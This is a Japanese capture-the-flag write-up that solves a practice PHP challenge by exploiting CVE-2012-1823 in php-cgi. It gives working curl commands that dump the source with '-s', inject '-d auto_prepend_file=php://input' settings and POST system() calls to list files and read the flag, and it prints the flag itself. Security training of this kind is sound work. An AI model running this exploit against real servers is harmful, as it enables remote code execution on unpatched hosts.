Q12.Hypertext Preprocessor 70pt
-------------------------------

問題
----
> http://ctfq.sweetduet.info:10080/~q12/

解き方
-----

アクセスしてみます。

```html
$ curl http://ctfq.sweetduet.info:10080/~q12/ 
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Clock</title>
    <style>
      body
      {
        background: black;
      }
      p
      {
        color: red;
        font-size: xx-large;
        font-weight: bold;
        text-align: center;
        margin-top: 200px;
      }
    </style>
  </head>
  <body>
    <p>2012:1823:20:19:12:25:08:13:10:58:05:49:58</p>
  </body>
</html>
```

次の理由でそれぞれの数字の対応は以下と推測できます。
 - ページタイトルがClock
 - 表示時の時刻情報と一致している

```txt
2012:1823:20:19:12:25:08:13:10:58:05:49:58
????:????:yy:yy:mm:dd:HH:MM:SS:ff:ff.ff.ff
```

先頭の2012:1823は何を表すか不明ですが、ググると[CVE-2012-1823](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823)というのがヒットします。

CVE(Common Vulnerabilities and Exposures) は公開された脆弱性のリストです。

これによると、CGI版PHPで=記号を省略されたクエリはコマンドライン引数(オプション)として処理されるようです。

> CVE-2012-1823 (description)
> sapi/cgi/cgi_main.c in PHP before 5.3.12 and 5.4.x before 5.4.2, when configured as a CGI script (aka php-cgi), does not properly handle query strings that lack an = (equals sign) character, which allows remote attackers to execute arbitrary code by placing command-line options in the query string, related to lack of skipping a certain php_getopt for the 'd' case.

試しに`-s`でソース表示を試みます(表示は適宜修正済み)。

```html
$ curl "http://ctfq.sweetduet.info:10080/~q12/?-s"
<?php
    //  Flag is in this directory.
    date_default_timezone_set('UTC');
    $t = '2012:1823:20:';
    $t .= date('y:m:d:H:i:s');
    for($i=0;$i<4;$i++)
        $t .= sprintf(':%02d',mt_rand(0,59));
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Clock</title>
    <style>
      body { background: black; }
      p { color: red; font-size: xx-large; font-weight: bold; text-align: center; margin-top: 200px; }
    </style>
  </head>
  <body>
    <p><?php echo $t; ?></p>
  </body>
</html>
```

成功しました。

ここから外部スクリプトを実行したいので`-d`オプションで次のphp.iniを読み込ませます。

```php
allow_url_include=On
auto_prepend_file=php://input
```

これで外部URLの読み込みを許可し、PHP実行に先立つスクリプトをdataで送信可能になります。

次のようなイメージです(以下は疑似文法)。

```bash
curl -X POST
    http://ctfq.sweetduet.info:10080/~q12/?
    -d allow_url_include=On
    -d auto_prepend_file=php://input
    -d "<?php system('ls -al'); ?>"
```

これを適切にエスケープしてやって実行します。

```html
$ curl "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" -X POST -d "<?php system('ls -al'); ?>"   
total 18668
dr-x--x--x 2 q12  q12      4096 Dec 28 09:50 .
drwx--x--x 3 root root     4096 Dec 28 09:50 ..
-r--r--r-- 1 q12  q12        90 Dec 28 09:50 .htaccess
-r-------- 1 q12  q12        22 Dec 28 09:50 flag_flag_flag.txt
-r-xr-xr-x 1 q12  q12       600 Dec 28 09:50 index.php
-r-xr-xr-x 1 q12  q12  19093315 Dec 28 09:50 php.cgi
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Clock</title>
    <style>
      body { background: black; }
      p { color: red; font-size: xx-large; font-weight: bold; text-align: center; margin-top: 200px; }
    </style>
  </head>
  <body>
    <p>2012:1823:20:19:12:28:00:55:08:40:29:30:23</p>
  </body>
</html>
```

`flag_flag_flag.txt`がフラグのようなのでこれを読めばよいです。

```html
$ curl "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" -X POST -d "<?php system('cat flag_flag_flag.txt'); ?>"
FLAG_ZysbiGgbHrN3f9zs
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Clock</title>
    <style>
      body { background: black; }
      p { color: red; font-size: xx-large; font-weight: bold; text-align: center; margin-top: 200px; }
    </style>
  </head>
  <body>
    <p>2012:1823:20:19:12:28:00:56:41:35:15:15:19</p>
  </body>
</html>
```

FLAG
-----
`FLAG_ZysbiGgbHrN3f9zs`

